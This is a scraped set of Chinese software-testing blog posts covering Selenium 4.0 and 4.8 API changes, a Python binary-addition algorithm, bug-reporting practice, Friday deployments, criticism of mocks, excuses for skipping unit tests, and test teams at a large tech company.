Duration.ofMillis(long millis); Duration.ofSeconds(long seconds); Duration.ofMinutes(long minutes); Duration.ofHours(long hours); Duration.ofDays(long days); 当然，我们还可以直接设置浏览器的各种全局等待时间，代码上看观感好了不少。\n1 2 3 4 ChromeOptions options = new ChromeOptions(); options.setImplicitWaitTimeout(Duration.ofSeconds(10)); options.setScriptTimeout(Duration.ofSeconds(10)); options.setPageLoadTimeout(Duration.ofSeconds(10)); 相对定位器 一些哲学流派告诉我们，世界是变化的，相对的，没有绝对的静，也没有绝对的动，物体总是相对着其他物体进行着运动。\n在之前的selenium版本里，我们大部分情况下只能通过绝对定位器来定位元素，比如\n定位一个id=xxx的元素 定位所有class=yyy的元素 定位所有的tag那么=zzz的元素 当然，还是有例外的，我们可以通过xpath或者css来不那么绝对的定位元素。比如\n.nav \u0026gt; li：定位class为nav的元素下所有的直接li子元素 #nav .item：定位id是nav下面所有的class为item的元素 这也是我推荐用css定位的原因，更灵活更简洁，同时可以跟前端的技术栈保持相对统一，xpath的定位能力更强一些，同时也带来了给多的复杂性和学习成本。\n在selenium 4.0中，相对定位器终于千呼万唤始出来，我们可以省去相对复杂的xpath表达式，用更加直观的方式来定位元素了，举个例子，下面是一个登录页面。\n其html代码如下：\n1 2 3 4 5 6 \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;large-6 small-12 columns\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;Password\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 我们试着去定位input之前的那个label，经验丰富的你可以想象到页面上会有非常多label，所以用tagname的方式应该不可取；另外这个label还没有其他更加独特的属性可以利用。不过我们可以发现，睡在他下铺的兄弟input有id属性，定位起来相对简单，很自然的会想到能不能利用input来定位label呢？现在都2021年了，这类的相对定位方式已经被支持了的。\n1 2 3 WebElement passwordArea = driver.findElement(By.id(\u0026#34;password\u0026#34;)); WebElement labelOfPass = driver.findElement(with(By.tagName(\u0026#34;label\u0026#34;)).above(passwordArea)); System.out.println(labelOfPass.getText()); 大家可以猜一猜上面代码的输出是什么？\ntoLeftOf/toRightOf/near 除了上面所展示的above方式以外，selenium 4.0还支持below，toLeftOf/toRightOf/near等方式，举个简单的例子。\n1 2 3 4 5 6 7 8 \u0026lt;tr\u0026gt; \u0026lt;td class=\u0026#34;name\u0026#34;\u0026gt;itest.info\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;website\u0026#34;\u0026gt;itest.info\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;actions\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#edit\u0026#34;\u0026gt;Edit\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#delete\u0026#34;\u0026gt;Delete\u0026lt;/a\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; 如果我们要定位上面的delete按钮，我们可以用下面的相对定位方式\n1 2 3 4 5 WebElement website = driver.findElement(By.xpath(\u0026#34;(//td[text()=\u0026#39;itest.info\u0026#39;])\u0026#34;)); driver.findElement(with(By.linkText(\u0026#34;Delete\u0026#34;)).toRightOf(website)).click(); // or driver.findElement(with(By.linkText(\u0026#34;Delete\u0026#34;)).near(website)).click(); 打开新窗口或者新标签页 在之前的selenium版本中，我们如果要打开新窗口或者是新标签页的话，我们需要先实例化1个driver对象，然后使用window handler来进行下一步的操作；在4.0以后，我们可以直接使用switchTo()方法来打开新窗口。下面是具体的例子：\n1 2 3 4 5 WebDriver driver = Driver.get(); driver.get(\u0026#34;http://www.itest.info/\u0026#34;); driver.switchTo().newWindow(WindowType.WINDOW); driver.get(\u0026#34;https://qq.com\u0026#34;); 打开新标签页也很好办，我们只需要修改WindowType就好了。\n1 2 3 4 5 WebDriver driver = Driver.get(); driver.get(\u0026#34;http://www.itest.info/\u0026#34;); driver.switchTo().newWindow(WindowType.TAB); driver.get(\u0026#34;https://qq.com\u0026#34;); DevTools协议 在4.0之后我们可以直接使用chrome的开发者工具接口来获取网络情况或者是性能数据了。下面的例子展示了如何使用devtools来设置自己的地理位置，自动化打卡签到有希望了。\n1 2 3 4 5 6 7 WebDriver driver = new ChromeDriver(); DevTools devTools = ((HasDevTools)driver).getDevTools(); devTools.createSession(); devTools.send(Emulation.setGeolocationOverride(Optional.of(38.89511), Optional.of(-77.03637), Optional.of(1))); driver.get(\u0026#34;https://my-location.org/\u0026#34;); 总结 selenium 4.0并没有带来特别多令人啧啧称奇的特性，不过从api的设计以及语义上，元素的定位上都有了不同程度的优化和提升，这也是selenium成熟的体现。作为1个从selenium rc时代就使用selenium的老用户，对这次大的版本更新我竟然觉得有一丝丝的感动，毕竟是一个开源项目，大家都有自己的工作和生活，能十几年如一日的维护和更新selenium本来就是一件不容易的事情，维护者们为了梦想和情怀还在努力，我们不妨也一起加油吧，学无止境，我独自迈步向前，让举步不前的人自己卷自己吧。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/selenium-4-0%E6%96%B0%E7%89%B9%E6%80%A7%E5%8F%8A%E6%96%B0%E6%97%A7api%E5%AF%B9%E6%AF%94/","title":"selenium 4 0新特性及新旧api对比"},{"content":"1月23日 selenium 4.8的正式版本发布了，\nWe’re very happy to announce the release of Selenium 4.8.0 for Java, .NET, Ruby, Python, and Javascript as well as the Grid and Internet Explorer Driver. Links to everything can be found on our downloads page.\n一些改动如下\nChrome DevTools support is now: v107, v108, and v109 (Firefox still uses v85 for all versions) Large JS executions have the name as a comment to help understand what payload being sent to/from server/driver. Deprecation of headless convenience method. Read more about in the headless blog post. Ruby overhauls Options classes (again) Initial BiDi support in JavaScript, Ruby, and improvements in Java. We’re continuing to remove Legacy Protocol classes in Java and Grid. Accommodate ability to specify sub-paths in Grid. Plus various language specific bug fixes; see the full list of changes in the Changelogs 简单翻译一下\n现在Chrome DevTools支持：v107、v108和v109（Firefox仍然使用v85的所有版本） 大型JS的执行有名称作为注释，以帮助理解被发送到/来自服务器/驱动程序的有效payload。 废弃启动headless浏览器的简便方法。 Ruby大修了Options类（再次）。 在JavaScript、Ruby中初步支持BiDi，并在Java中进行了改进。 我们正在继续删除Java和Grid中的遗留协议类。 适应grid中指定子路径的能力。 加上各种特定语言的bug修复；请看Changelogs中的完整变化列表 值得注意的变化 headless启动方式变了，因为headless有2个版本，新版本和旧版本，一般来说新版本比旧版本要好，不过默认的headless启动的是老版本，简单起见就去掉了对于旧版本直接启动的支持。用代码来说话就直观多了。\n之前的启动driver方式\n1 2 3 4 5 6 //之前的启动方式 options = ChromeOptions() options.headless = True driver = webdriver.Chrome(options=options) driver.get(\u0026#39;http://selenium.dev\u0026#39;) driver.quit() 新的启动方式\n1 2 3 4 5 ChromeOptions options = new ChromeOptions(); options.addArguments(\u0026#34;--headless=new\u0026#34;); WebDriver driver = new ChromeDriver(options); driver.get(\u0026#34;https://selenium.dev); driver.quit(); 新增了一些原始的对BIDI的支持。\n关于BIDI，项目主页是这么说的\nWebDriver BiDi is a proposed bidirectional protocol for browser automation, building on and extending WebDriver\n看起来像是新一代的双向协议，之前的webdriver协议主要是客户端向driver端发请求，driver给出回应就好了，跟访问网页服务器给出响应差不多，就像是答记者问；新的协议更像是聊天，客户端跟浏览器直接唠嗑，是对之前场景的扩展，因为是双向的所以应该有长链接，对于性能和稳定性以及实时性上估计会有显著提升。\n不过现在bidi还是处于非常早期阶段，se也只是开始进行支持，什么时候可以正式发布这点还不得而知。\n其他的更新就是一些代码重构，比如ruby语言的Option类重构，做减法，比如去掉之前的一些旧的协议支持，再就是日常更新，支持更新的devtool和永远不会缺席的bugfix。\n总结 总的来说这次的更新对于selenium的终端用户来说变化不大，大家可以放心升级。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/selenium-4-8%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83/","title":"selenium 4 8正式发布"},{"content":"最近寒风凛冽，估计不少同学都在刷算法题了，这里给大家介绍一个python实现的算法仓库，里面有很多常见算法的实现，有兴趣的同学可以先通过既有算法学习，掌握一些套路之后再由易到难把题刷起来。仓库地址：https://github.com/keon/algorithms\n先给大家分享一个二进制加法的算法吧。\n题目 输入：2个二进制的字符串\n输出：也以二进制的方式返回相加后的结果\n比如\n1 2 3 a = \u0026#34;11\u0026#34; b = \u0026#34;1\u0026#34; Return \u0026#34;100\u0026#34; 分析 这道题看完之后我基本上没有任何思路，丝毫没有一点点挣扎，直接看答案了。\n实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def add_binary(a, b): s = \u0026#34;\u0026#34; c, i, j = 0, len(a)-1, len(b)-1 zero = ord(\u0026#39;0\u0026#39;) while (i \u0026gt;= 0 or j \u0026gt;= 0 or c == 1): if (i \u0026gt;= 0): c += ord(a[i]) - zero i -= 1 if (j \u0026gt;= 0): c += ord(b[j]) - zero j -= 1 s = chr(c % 2 + zero) + s c //= 2 return s 看完以后发现实现思路非常的精妙。\n首先确定’0’这个字符的ascii码，zero的值就是整形的48。\n下面遍历两个字符串的每一位，从低位到高位，如果当前位存在的话，则取这一位的ascii码减去zero，因为是二进制，所以当前位的值要么是0要么是1，所以每次遍历相减后得到的结果要么是0要么是1，这就等于是把当前位从字符转成了二进制。所以后面如果有类似的字符或字符串转成二进制的题，可以参考每一位减去ascii 0的实现方式。\n取一个数c，保存两个字符串当前位的和，所以c的取值一定是固定的\n无进位的情况 c = 1 + 1 = 2 c = 1 + 0 = 1 c = 0 + 1 = 1 c = 0 + 0 = 0 有进位，c就等于1 c = 1 + 1 + 1 = 3 c = 1 + 0 + 1 = 2 c = 0 + 1 + 1 = 2 c = 1 + 0 + 0 = 1 好了，下面再用c去模2，在c = 2或者是0的时候，就可以得到当前位的值是0，c是1或3的时候当前位就是1，这里用取模的方式实现了二进制的加法，简单却深刻和优雅。\n最后一步改变c的值，如果c=2的话，证明是有进位的，其他情况下没有进位，所以把c的值变成c除以2的商，当且仅当c为2的时候，c会变成1，其他情况下由于不能整除，c又恢复成0，优雅的用整除实现了进位。\n分解 以a = 11, b = 1为例子，每次从ab里取1位，分别记作x，y，输出的字符串为s，因此我们有4个变量，x，y，c，s\nx = 1, y = 1, c = x + y = 2, s = “” + c % 2 = “” + “0” = “0”, c = c / 2 = 1，第一步之后s是”0”, c = 1 x = 1, y = 0, c = x + y = 2, s = “0” + c % 2 = “0” + “0”, c = c / 2 = 1，这一步之后s是”00”, c = 1 c = 1, s = “0” + c % 2 = “00” + “1”, s = “100”, c = c / 2 = 1 / 2 = 0, 不满足循环条件，退出，最终结果100 总结 其实没啥好总结的，这道题看起来简单，但是不看答案真不知道该怎么下手。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/string%E7%AE%97%E6%B3%95%E4%B9%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E6%B3%95/","title":"string算法之二进制加法"},{"content":"会不会提bug是体现测试同学专业性的一个很重要的方面，关于这方面的讨论也是相对比较多的，最近发现了一些有意思的梗图，有些真的挺有意思的，跟大家分享一下。\n关于是不是真的需要提个bug 开发和测试总有不同的理解。\n问题根因分析 很多时候我们发现的问题其实只是误会，或者说是无效的，比如在不小心部署的中间版本上测试，某些全局配置项设置有误等，这时候需要测试同学进行根因分析，实锤是bug之后再提会更合适一些。那么问题就来了，如何进行有效的分析呢？下面是一些我们可以尝试的方向\n日志 监控 代码分支 配置文件或配置中心 很多时候我们感到困难的是如何去获得上面的数据，比如如何获取用户机器上的日志？\n标题党 好的标题可能意味着一切，标题可以尽量消除歧义，让人一目了然，当然长篇大论也是不可取的，总之写bug的标题经常会让经验不是非常丰富的同学感到挣扎。\n重现步骤 我们需要确保我们的缺陷是可重现的，我们需要添加关于如何重现问题的确切步骤，单步应该代表一个单一的动作，避免在重现步骤中使用“and”和“or”，因为这些添加了不必要的模棱两可。在描述客户出现的问题时，可以理解的重现步骤就更加重要了。\n包含截图screenshot 英文表示截屏的单词唤作screenshot，就像下面一样\n一张好的截图胜过万语千言了，而且很多开发其实只看图，一般情况下，对于web应用而言，尽量用全屏截图，因为这样可以包含浏览器的url，对排查问题很有帮助；另外有条件的情况下可以把开发者工具（windows操作系统上可以按F12打开）中的console或者network标签页也截进去，出错的地方重点高亮一下。\n录屏 录屏我觉得可以分两种\n录成视频 录成可以自动执行回放的脚本 第二种比较困难，但在web上也有不少可以尝试的工具\n实际结果和预期结果 预期 - 系统应该做什么 实际 - 实际发生了什么 描述应该简明扼要，避免歧义，比如不要用“是否”， “有没有”， “是不是” 日志和堆栈 有条件的话我们应该提供相关的日志和堆栈，特别是在移动端进行测试的情景下。\n软件版本和分支信息 对于客户端来说软件版本，比如操作系统版本，客户端版本等信息非常重要，对于后台系统来说分支信息对于错误分析也是相当有帮助的，所以有条件的情况下最好都包括上。\n数据库查询结果 在bug里贴上数据库查询语句和查询结果是非常高效且专业的。\n确定严重性和优先级 可以像下面这张表一样，用4个象限去区分优先级\n高严重性和高优先级 低严重性和高优先级 低严重性高优先级 低严重性低优先级 保持专业 最后但并非最不重要的一点是，在报告缺陷时，重要的是要坚持事实并使用专业和尊重的语言，避免添加个人意见，关于如何解决问题的建议，推卸责任和指责，吐槽的内容就留给之后的复盘会议好了。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/xswl%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8E%E6%8F%90bug%E7%9A%84%E6%A2%97%E5%9B%BE/","title":"xswl：一些关于提bug的梗图"},{"content":"一般情况下我们都会避免在周五进行发布，毕竟大家都不喜欢\n周五留下来加班发布，周五还是早点回去比较好 万一发出问题来了周六周日还要想办法去修复，休息的时间无形中被占用了 不过最近看到一篇文章观点很有意思，作者认为只要做的够好，在周五发布其实也不是什么大不了的事情。原文地址在这里，https://dev-tester.com/feel-free-to-deploy-on-friday/?utm_campaign=Software%2BTesting%2BWeekly\u0026amp;utm_medium=email\u0026amp;utm_source=Software_Testing_Weekly_147。 我稍微翻译了一下大意，也许它山之石可以攻玉。\n省略前面若干字。\n然而，我坚信，如果你想创建一个高质量的应用程序，大多数开发和测试团队的 \u0026ldquo;看在上帝的份上，不要在星期五部署 \u0026ldquo;的态度是不可取的。\n为什么避免周五部署是一种不健康的质量控制习惯？ 当一个团队像躲避瘟疫一样躲避周五部署时，通常可以认为他们对自己的的产品、流程或两者缺乏信心。这种不情愿通常源于组织需要知道或信任他们的应用程序已经准备好让客户使用。任何时候有人说 \u0026ldquo;我们不会在周五部署\u0026rdquo;，他们真正说的是 \u0026ldquo;我们不相信我们的应用程序或流程会在周五部署\u0026rdquo;。\n从长远来看，这种想法并不能带来高质量的系统。团队并不把这些不确定性的作为一个表明他们需要专注于改进的信号。无论缺乏信任和信心是一个现实的问题还是一个想象中的问题，大多数团队都采取简单的方法来掩盖问题，而不是花时间去寻找改进问题的方法。他们想出了一些规则，比如周五不进行部署。\n与其避免在周末进行部署，不如正面解决这些问题，加强现有的流程，让团队在任何需要的时候都能自由地进行部署。 作为一个开发人员或测试人员，如果不用担心因为在下班前要更新你的应用程序而使你的周末被打断，你会有什么感觉？\n任何认真推动整个团队和产品的质量的组织必须在他们的公司中建立这种信任。虽然对你的系统完全有信心需要时间，但好消息是任何人都可以做到这点，无论他们认为他们的应用程序和流程在他们的组织中是多么的混乱不堪。下面的三步计划可以让你比你想象中的更快达到目的。\n第一步：实现一个稳定的自动化测试集 自动化测试用例集合是任何想要快速构建和发布而不需要经常担心他们的应用程序的软件开发团队的必备工具。如果没有自动化测试套件，你就会严重削弱你的团队工作和部署的能力。如果你还没有给自己或你的团队一个空间来增加自动化测试覆盖率，你就会让自己处于不利的位置。\n提升质量的第一步是用自动化测试去覆盖所有的关键路径，所以如果你是从头开始，请关注这一步。然而，比覆盖率更重要的东西是稳定性。即使有很高的覆盖率，如果你的测试自动化不断失败，也不会有什么帮助。如果你的测试用例很不稳定，你在任何时候都不会感到舒服，更不用说在星期五部署了。在测试覆盖率方面的工作，重点是建立一个强大的、可维护的测试框架，以保持你的团队长期的高信心。\n另一个重点领域是你应该做什么类型的测试。根据你的应用程序的需求，你可能需要各种自动化测试的混合。有些团队写了几个单元测试就结束了，但今天的现代应用程序有很多变化的地方，你需要检查E2E、验证性能、确保安全性和可访问性等这些都只是冰山一角，提前计划哪些类型的自动化测试可以使你的组织受益。\n知道你需要什么类型的测试和你想覆盖的领域。拥有一个稳定的自动化测试用例集和正确的测试组合将加强你的团队对你的应用程序和部署的信心。\n第二步：不要忘记手动探索性测试 当团队养成了为他们的应用程序建立稳定的自动化测试的习惯，他们可能会对他们的测试套件在部署前捕捉问题的能力过于自信。通常，一种错误的安全感导致组织内的人认为他们不需要用测试自动化实践来执行额外的测试活动。这种想法与事实相差甚远。不管你的测试自动化习惯有多好，或者你的测试覆盖率有多高，你都不能忽视手动、探索性测试的重要性。\n自动化测试只能做他们被告知要做的事情，在快速开发周期中很好进行功能回归。另一方面，手动和探索性测试将允许你观察自动测试的盲点，并在没有人想到的地方发现问题\u0026ndash;所谓的 \u0026ldquo;未知的未知\u0026rdquo;。忽视测试的这一重要部分而依赖自动化，不可避免地会导致产品质量下降。\n人工测试需要时间和精力来完成。一些团队，特别是没有专门的QA团队的小团队，往往在最后一刻才进行这些测试。与我合作的大多数初创企业只在重大部署前几天甚至几小时做探索性测试。有时这很有效，但你有可能匆忙完成这个过程，让bug遗漏到了线上。\n理想情况下，手动探索性测试应该在整个团队的开发周期中持续进行并伴随着新的构建在staging环境上进行部署。让你的组织有时间做这种测试，你会发现自己在任何时候都不会担心部署的问题。\n第3步：建立一个自动化的构建和部署流程 在构建软件的组织中，开发和发布周期的一个部分经常被遗忘，那就是构建和部署过程。在我工作过的一些地方，构建和部署一个新的版本几乎感觉像是一个神秘的过程，只有少数被选中的人才能完成。他们的部署通常由一个漫长的步骤组成，按照精确的顺序和几乎完美的时机进行。如果执行这种仪式性行为的人在途中寄掉，这个过程的脆弱性可能会在瞬间使整个应用程序崩溃。\n我描述这个过程的方式可能略显夸张，但却非常接近事实。我合作过的许多公司都有不必要的复杂部署程序。当被问及原因时，一些团队试图证明为什么需要这样做，但他们回答背后的潜台词其实是 \u0026ldquo;我们一直是这样做的，所以我们从未改变过\u0026rdquo;。常见的原因是，很久以前有人创造了这个复杂的过程。既然它是有效的\u0026ndash;不管这个过程变得多么微妙或曲折\u0026ndash;他们从来没有费心去改善现状。\n如果你的团队必须执行多个步骤来构建和部署你的应用程序的新版本，那么你就对你的组织造成了巨大的伤害。无论你的整个系统包含多少模块，你都可以将几乎所有的发布过程自动化\u0026ndash;甚至将其浓缩为一个命令。如今，我们有大量优秀的工具，从Jenkins到AWS CodePipeline到CircleCI和无数其他工具，使构建和部署过程自动化变得非常简单。你的组织没有任何借口可以避免自动化部署。\n部署过程中一个同样重要但被遗忘的部分是回滚失败的部署。尽管有一个经过良好测试的自动化过程，它仍然可能由于许多不同的原因而失败，从糟糕的代码被合并到你的应用程序的基础设施的故障。大多数团队发现他们没有任何回滚策略，当部署失败时，他们的应用程序就会停机。在这种情况发生之前，制定一个适合你的情况的回滚策略，并经常测试，以确保当墨菲定律发生时，你不会感到惊讶。\n总结 这篇文章的目的不是让你的团队每周五进行部署，而是让他们在需要时可以毫无顾虑地进行部署。自信部署而不用担心某些幺蛾子会发生的能力，会让每个开发人员和测试人员在他们的项目周期中不用担心太多。如果我们幸运的话，也许我们会看到更少的memes在我们的LinkedIn feeds上乱窜。\n总之作者的观点是如果你够强，什么时候部署都没问题。然而时间总是自己的，为了不必要的节外生枝，还是建议大家在周五下班前或者下午不要进行部署，多一事不如少一事，不在周五部署不是真理，而是生活。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%B8%8D%E8%A6%81%E5%AE%B3%E6%80%95%E5%9C%A8%E5%91%A8%E4%BA%94%E9%83%A8%E7%BD%B2/","title":"不要害怕在周五部署"},{"content":"最近看到一篇关于mock的文章，觉得挺有道理的，，简单总结分享一下，原文在这里：https://levelup.gitconnected.com/why-mocks-are-considered-harmful-b4e8fe60478d。 文章的观点很简单，就是mock其实是弊大于利的。\n自动化测试涉及到很多技术，其中mock技术我们应该尽量避免使用。mock用的好其实也只是锦上添花，用的不好的话则会给你带来一些过度的自信。\n首先看下什么是mock。mock其实就是模拟代码中的一些外部访问行为，比如访问第三方的付款api或者是对数据库进行访问，这会给单元测试带来一些好处\n运行加速，因为你不需要访问额外的服务； 提升稳定性，第三方服务提供商的一些不稳定因素被规避掉了 不过mock是为一些具有副作用的代码服务的，也就是说这些代码其实是依赖于外部服务，并不是依赖于各种参数的输入。我们可以把函数分成两类\n纯粹的函数：没有外部依赖的函数 不纯粹的函数：有外部依赖的函数 mock带来的问题 mock不等同于其替换掉的服务。\n比如你把代码中数据库访问的部分给mock掉了，这意味着你的代码可能会在有mock的时候工作良好，然而你还是需要进行集成测试以确保在没有mock的时候也可以正常工作。\n不可能进行特性平替\n如果你使用的是简单的mock方式，那么mock可能不会返回一些有用的数据，你花在mock上的时间越多，mock返回的data可能会约实用。然而mock不能平替被mock系统的方方面面。\n开发了mock但不使用其实就是浪费时间\n如果你开发了数据库的mock但从不使用的话，这就是浪费时间了。在现实世界中这是很有可能发生的，因为代码可能需要获取一些真实配置去做初始化，而mock的时候却很难满足这一条件。\n如何去找到mock的替代方案 很简单，就是重构代码，把代码重构成纯粹的函数和不纯粹的函数两种，纯粹的函数是不需要mock就可以测试的，，不纯粹的函数则可以通过集成测试来进行验证。\n举个例子\n1 2 3 4 5 6 def logic(): x = addition(1, 3) y = multiplication(2, 4) z = x + y database_write(z) return 上面的函数就是不纯粹的函数，因为其访问了db，然而我们还是可以把这个函数重构成1个纯粹函数和另一个不纯粹的函数\n1 2 3 4 5 6 7 8 9 def calc(a, b, c, d): x = addition(a,b) y = multiplication(c,d) return x + y def logic(): z = calc(1, 5, 2, 4) database_write(z) return 这样calc函数可以用单元测试覆盖了，而logic则留给集成测试去考虑吧。\n最后尽可能的优化你的自动测试方案，让更多的代码都通过自动化进行覆盖。\n总结 mock短期来看可能是一种解决问题的方式，然而长期看来确是一个麻烦的问题。如果你想快速交付软件产品的话，那么你应该少花时间在mock上，多花点时间在重构和自动化测试上面。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%B8%8D%E8%A6%81%E5%86%8D%E4%BD%BF%E7%94%A8%E4%BA%86mock%E4%BA%86/","title":"不要再使用了mock了"},{"content":"看到了一篇不错的关于单元测试的文章，于是就机翻加改写了一下。作者的观点是适当的，不过稍微欠缺了些数据。原文地址：https://betterprogramming.pub/why-dont-we-do-unit-testing-e0bb55a38aa2\n我开始打算写一篇关于单元测试及其背后的哲学和过程的文章。 我想谈谈完成对项目的一组更改并能够部署它们所带来的满足感，因为数百个单元测试正在通过，并且在生产中出现问题的可能性很小。 然后我意识到我参与过的大多数项目（在计算行业的长期职业生涯中）都没有使用任何类型的单元测试。 因此，我认为检查未使用单元测试的各种原因以及对这些项目的影响可能会有所帮助。\n没有测试工具 当我在 80 年代开始以编程为生时，这是一个很好的借口。在 pascal 中编写航空电子代码，我们确实编写了测试，但几乎不得不推出我们自己的测试框架。这里没有fakes、mocks或DI。 但是，如果您今天使用 Visual Studio 在 .Net/C# 中编写代码，则没有理由不测试任何重要代码。 VS Code 有一个内置的测试运行器，其他测试运行器也可用。fake和mock框架被广泛使用，另外还有非常优秀的CI/CD支持，可以让你在构建过程中自动化的运行单元测试。\n后面作者又列举了一些例子来证明一个观点：就是测试工具实际上是持续进化的，而且现在已经很强大了，因此他的核心观点应该是在如今这个年代，单元测试工具其实不应该是匮乏的，大家应该有不少的选择。\n我们没有时间做测试 客户希望我们现在发货。写一些代码就行了。先搞出来吧，没有时间学习有关单元测试的象牙塔软件工程学士学位！ 你多久听说过一次？ 这种方法通常似乎在最初几周有效。然后，当您陷入莫名其妙的错误和副作用的泥潭时，生产力就会下降。加倍努力，开夜车，让更多的人进行手动测试！ 不必如此。我会说你没有时间不做测试。\n看看上面的图表。橙色线显示“没有做单元测试”项目。 起初，我们可以通过不进行任何测试来节省时间。 随着越来越多的功能被实现，（手动）回归测试的负担呈指数级增长。添加的每个新功能都会带来额外的回归测试负担。 很快，您的项目将不得不在质量、成本和实现每个新功能所需的时间之间做出妥协。 所以是的，最初编写一个好的单元测试可能比手工测试你的功能要长两到三倍。但是经过两三个循环的回归测试，你就会领先——而且只会变得更好。\n我们发现写单元测试好难 编写测试很难，这是绝对正确的。 编写好的测试更难。但不写测试会让你的生活更加艰难（或者你真的喜欢手动测试你的前任 5 年前写的代码？？？） 如果您的开发人员不知道如何编写好的测试，那么他们可能还不是好的开发人员（目前）。 但是他们可以学习。 写测试用例是一个不断进度熟能生巧的过程， 你做的越多，它就会变得越快越容易。 让最好的开发人员编写“模范”测试。 这些可以被经验不足的开发人员用作模板来创建他们自己的测试。 创建测试基类。 我经常这样做是为了封装经常重用的功能并简化单个测试用例。\n单元测试是白费力气！ 当我花时间编写单元测试时，我从不认为这是浪费时间。 如果我编写代码并手动测试它，我认为这是浪费精力。 在一系列手动测试结束时我会得到什么？ 代码在我做手动测试时候是没问题可以正常工作的，但如果我更改代码，我将不得不重复这些测试（或者更有可能不打扰\u0026hellip;\u0026hellip;） 如果我创建了自动化测试，那么我就有了一个测试套件，我可以随时重新运行这些测试，以验证代码是否仍然按照我编写时预期的方式工作。 更重要的是，如果我离开并且一位同事接管了这段代码，他们就会继承这个祖传的测试套件，他们可以使用这些测试来验证他们的更改没有破坏它，并且代码仍然以我预期的方式工作。 手动测试是浪费精力——手动测试的剩余价值为零（并且通常没有记录，因此不可重复）。 自动化测试可以在未来几年内使用，以证明您的软件仍然按预期工作。\n但是我们浪费了太多时间来修复失败的测试！ 我有没有提到编写单元测试很难？ 单元测试的目的是测试程序的核心功能。如果你不确定你的程序做什么（这比你想象的更常见），那么你将无法编写健壮的测试。 如果测试失败，这意味着您的软件不再按照您最初的预期运行。这可能是好事——因为你可能改变了需求（但是你不应该先改变测试来反映新的预期行为吗？）。 这也可能意味着您破坏了代码，至少您现在知道有一个问题需要解决。 编写健壮测试的第一步是准确了解您的软件应该做什么，这不会是坏事吧？ 测试驱动开发(TDD) 意味着您的代码在设计时至少需要考虑如何测试它。我建议您考虑 SOLID 原则和 DRY，以及它们如何应用于您正在编写的代码。这将始终使您的代码更好，并且更容易有效地进行测试。 我的经验是，这在各个方面都可以带来更好的代码。\n但是我们的代码从来没有被设计为进行单元测试！ 最困难的事情之一是尝试为现有代码编写测试。 它不是为测试而设计的，您经常会因为尝试测试没有规范的代码而让自己分心——这些代码试图执行许多不同且互不相关的操作（还记得 SOLID 中的“S”吗？）。 也许代码一开始就没有写好？ 理想情况下，您在编写代码时编写单元测试。 尝试返回并为现有代码编写测试通常会突出一个事实，即现有代码设计不佳，并且其需求缺乏清晰度。 这通常导致需要修复和更新现有代码，不过这也许不失为一件好事吧，见仁见智了。\n写在最后 多少单元测试就足够了？ 作为一个粗略的经验法则，我会说你应该编写至少与你正在测试的代码一样多的单元测试代码。 通常情况下测试代码要多得多。 编写单元测试仍然比不编写测试用例，然后花时间尝试在最终的产品上调试错误要快。\n这一切有什么好处？ 单元测试的最终结果是一组可以在构建pipeline中运行的测试，这些测试将阻止任何破坏性修改合并到您的代码库中，或部署到任何生产环境中去。 从长远来看，单元测试将为您节省时间，并使您能够以更少的资源更快地交付质量更好的产品。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%B8%8D%E5%81%9A%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%9A%846%E5%A4%A7%E5%80%9F%E5%8F%A3/","title":"不做单元测试的6大借口"},{"content":"之前发过一篇公众号文章，大意是字节某些部门在推进去测试化，当时就有同学留言表示，在字节的某些部门测试同学其实很多，果不其然，昨天跟一位字节的候选人聊天，候选人就表示在他所在的部门，测试同学确实不少。\n他表示他们部门的测试主要有两种编制的同学构成，分别是正式和外包，正式员工跟外包的比例是1：2，整个部门有几百人的测试规模。\n由于时间关系，我也没仔细了解这几百人全部是正式员工还是外包员工，也没弄清楚他们部门一共有多少人，不过从一个单体产品的角度上看，这几百人的规模还是比较大的。\n这些信息拼凑起来，我们可以知道大公司的去测试化进度并不是整个公司统一的，可能有些部门比较激进，有些部门就保守一些，测试同学的数量很多，但可能是外包为主。比如很多年前手Q团队的测试人数特别多，但是正式员工其实数量有限，大部分的功能测试都是外包同学，华为也类似。\n那么字节这个部门的测试同学在做些什么呢？\n候选人表示在4个方面进行探索。\n质量维度。负责产品的质量保障工作，这点大家其实很熟悉了； 安全维度。负责产品的安全测试和安全方面的各种建设，其实候选人也表示这里的安全可能不够准确，其实应该是各种专项维度，比如性能稳定性之类的，不会只局限于安全； 体验维度。这里是最有意思的，我们可以想一想，影响用户体验的是哪些因素？是不是应用的打开速度，给你推送内容的精准度之类？这里的体验就是量化可以影响用户体验的指标，然后持续监控指标，保障指标的值持续达标；比如持续监控app crash率，一旦大于某个阈值就告警，然后紧急进行定位和修复； 效率维度。通过工具或其他活动提升测试效率。这里可以理解为偏测试开发的部分，比如开发测试工具提高自动化回归的效率等； 